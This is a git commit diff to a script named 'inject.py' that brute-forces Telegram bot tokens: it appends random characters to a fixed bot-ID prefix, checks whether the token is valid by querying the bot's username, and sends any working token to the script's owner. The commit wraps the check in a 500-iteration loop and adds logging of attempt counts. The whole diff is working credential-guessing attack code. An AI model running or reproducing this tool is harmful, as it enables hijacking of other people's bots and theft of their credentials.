5ea7d7cc79c00e54d7c2b6cf42a8cd076d60cea8
Himanshu kumar <83366556+I-Himanshu@users.noreply.github.com>
2021-09-28 00:10:39 +0530

    update inject.py

--- inject.py
+++ inject.py
@@ -1,12 +1,17 @@
 #ADMlNxd 2.0
 token = "609517172:AA" + "".join(random.choices(chars,k=33))
 new_bot = Bot(token)
-try:
-  username = new_bot.username
-  if username:
-    print(token)
-    LOGGING(username)
-    new_bot.send_message(OWNER, token)
-    LOGGING("Har Har Mahadev 🚩")
-except:
-  pass
+for k in range(500):
+  try:
+    username = new_bot.username
+    if username:
+      print(token)
+      LOGGING(username)
+      new_bot.send_message(OWNER, token)
+      LOGGING("Har Har Mahadev 🚩")
+  except:
+    pass
+  if botNo == THREAD_COUNT - 1:
+    ATTEMPT += 1
+    if ATTEMPT % 1000 == 0:
+      LOGGING("```{}``` Group have completed {} attempt".format(GROUP_NAME, ATTEMPT))
